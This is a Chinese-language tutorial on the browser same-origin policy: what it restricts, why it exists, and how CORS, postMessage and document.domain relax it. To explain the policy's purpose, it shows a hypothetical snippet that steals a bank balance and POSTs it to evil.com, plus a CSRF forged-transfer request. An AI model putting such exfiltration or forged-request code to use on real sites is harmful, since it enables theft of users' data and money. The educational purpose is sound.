---
title: 什么是同源策略
category: 网络
difficulty: 中级
updatedAt: 2025-12-01
summary: >-
  深入理解浏览器的同源策略机制,包括同源的定义、同源策略的限制范围、为什么需要同源策略,以及同源策略对前端开发的影响。
tags:
  - 同源策略
  - 浏览器安全
  - 跨域
  - Web安全
estimatedTime: 20 分钟
keywords:
  - 同源策略
  - Same-Origin Policy
  - 跨域
  - CORS
highlight: 理解浏览器安全的基石——同源策略的工作原理和限制
order: 2
---

## 问题 1：什么是同源策略

同源策略(Same-Origin Policy)是浏览器最核心的安全机制之一。它限制了一个源(origin)的文档或脚本如何与另一个源的资源进行交互。

**什么是"同源"**:

两个 URL 如果协议、域名和端口都相同,则认为它们是同源的。

```javascript
// 假设当前页面 URL 是: https://www.example.com:443/page.html

// ✅ 同源
https://www.example.com:443/api/data
https://www.example.com/other.html

// ❌ 不同源
http://www.example.com/page.html      // 协议不同 (http vs https)
https://api.example.com/data          // 域名不同 (api.example.com vs www.example.com)
https://www.example.com:8080/data     // 端口不同 (8080 vs 443)
```

**注意**: 对于 `http` 协议,默认端口是 80;对于 `https` 协议,默认端口是 443。

---

## 问题 2：同源策略限制了哪些行为

同源策略主要限制以下三个方面:

### 1. DOM 访问限制

不同源的页面无法互相访问对方的 DOM。

```javascript
// 页面 A: https://a.com
const iframe = document.createElement("iframe");
iframe.src = "https://b.com";
document.body.appendChild(iframe);

// ❌ 无法访问跨域 iframe 的内容
iframe.contentWindow.document; // 报错: Blocked by CORS policy
```

### 2. Cookie、LocalStorage 和 IndexedDB 访问限制

不同源的页面无法读取对方的 Cookie、LocalStorage 和 IndexedDB。

```javascript
// 页面 A (https://a.com) 无法读取页面 B (https://b.com) 的数据
localStorage.getItem("key"); // 只能访问自己源的数据
```

### 3. Ajax 请求限制

不同源的页面无法直接发送 Ajax 请求获取响应数据。

```javascript
// 当前页面: https://a.com
fetch("https://b.com/api/data")
  .then((res) => res.json())
  .catch((err) => {
    // ❌ 报错: Access to fetch at 'https://b.com/api/data'
    // from origin 'https://a.com' has been blocked by CORS policy
  });
```

**不受同源策略限制的内容**:

- `<script src="...">` 标签加载的脚本
- `<link href="...">` 标签加载的样式
- `<img src="...">` 标签加载的图片
- `<video>` 和 `<audio>` 标签加载的媒体资源
- `<iframe>` 标签嵌入的页面(但无法访问其 DOM)
- `@font-face` 加载的字体(需要 CORS 支持)

---

## 问题 3：为什么需要同源策略

同源策略是为了保护用户数据安全,防止恶意网站窃取用户信息。

**假设没有同源策略,会发生什么**:

### 场景 1: 恶意网站窃取用户信息

```javascript
// 用户在 https://bank.com 登录了银行网站
// 然后访问了恶意网站 https://evil.com

// 恶意网站可以这样做:
const iframe = document.createElement("iframe");
iframe.src = "https://bank.com/account";
document.body.appendChild(iframe);

// ❌ 如果没有同源策略,恶意网站可以:
const bankDoc = iframe.contentWindow.document;
const balance = bankDoc.querySelector(".balance").textContent;
// 窃取用户的银行账户余额

// 甚至可以:
fetch("https://evil.com/steal", {
  method: "POST",
  body: JSON.stringify({ balance, userInfo }),
});
```

### 场景 2: CSRF 攻击

```javascript
// 恶意网站可以利用用户的登录状态发起请求
fetch("https://bank.com/transfer", {
  method: "POST",
  credentials: "include", // 携带 Cookie
  body: JSON.stringify({
    to: "attacker-account",
    amount: 10000,
  }),
});
```

**同源策略的保护作用**:

- 防止恶意网站读取其他网站的敏感数据
- 防止恶意网站冒充用户操作
- 保护用户的隐私和财产安全

---

## 问题 4：同源策略对前端开发有什么影响

同源策略虽然保护了安全,但也给合法的跨域需求带来了挑战。

**常见的跨域场景**:

### 1. 前后端分离

```javascript
// 前端: http://localhost:3000
// 后端: http://localhost:8080

// ❌ 直接请求会被同源策略阻止
fetch("http://localhost:8080/api/users")
  .then((res) => res.json())
  .catch((err) => console.error(err)); // CORS error
```

### 2. 调用第三方 API

```javascript
// 调用第三方天气 API
fetch("https://api.weather.com/data")
  .then((res) => res.json())
  .catch((err) => console.error(err)); // 可能被 CORS 阻止
```

### 3. 子域名之间的通信

```javascript
// 主域名: https://example.com
// 子域名: https://api.example.com

// 默认情况下也被视为不同源
```

**解决跨域的常用方法**:

- CORS(跨域资源共享)
- JSONP
- 代理服务器
- postMessage
- WebSocket
- Nginx 反向代理

---

## 问题 5：如何放宽同源策略的限制

在某些场景下,我们需要在安全的前提下放宽同源策略。

### 1. document.domain (已废弃)

用于子域名之间的通信:

```javascript
// 页面 A: https://a.example.com
// 页面 B: https://b.example.com

// 两个页面都设置
document.domain = "example.com";

// 现在可以互相访问 DOM
```

**注意**: 这个方法已经被废弃,不推荐使用。

### 2. window.postMessage

用于不同源的窗口之间通信:

```javascript
// 父页面 (https://a.com)
const iframe = document.querySelector("iframe");
iframe.contentWindow.postMessage("Hello", "https://b.com");

// 子页面 (https://b.com)
window.addEventListener("message", (event) => {
  if (event.origin !== "https://a.com") return; // 验证来源
  console.log(event.data); // 'Hello'
});
```

### 3. CORS

服务器通过设置响应头允许跨域:

```javascript
// 服务器端设置
Access-Control-Allow-Origin: https://a.com
Access-Control-Allow-Methods: GET, POST
Access-Control-Allow-Credentials: true
```

## 总结

**核心概念总结**:

### 1. 同源的定义

- 协议、域名、端口三者完全相同才是同源
- 默认端口可以省略(http:80, https:443)

### 2. 同源策略的限制

- DOM 访问限制
- 存储访问限制(Cookie、LocalStorage、IndexedDB)
- Ajax 请求限制

### 3. 同源策略的意义

- 保护用户数据安全
- 防止恶意网站窃取信息
- 防止 CSRF 攻击

### 4. 跨域解决方案

- CORS(最常用)
- JSONP(只支持 GET)
- postMessage(窗口通信)
- 代理服务器

## 延伸阅读

- [MDN - 浏览器的同源策略](https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy)
- [MDN - CORS](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CORS)
- [Web.dev - Same-origin policy](https://web.dev/same-origin-policy/)
- [OWASP - CSRF 防护](https://owasp.org/www-community/attacks/csrf)
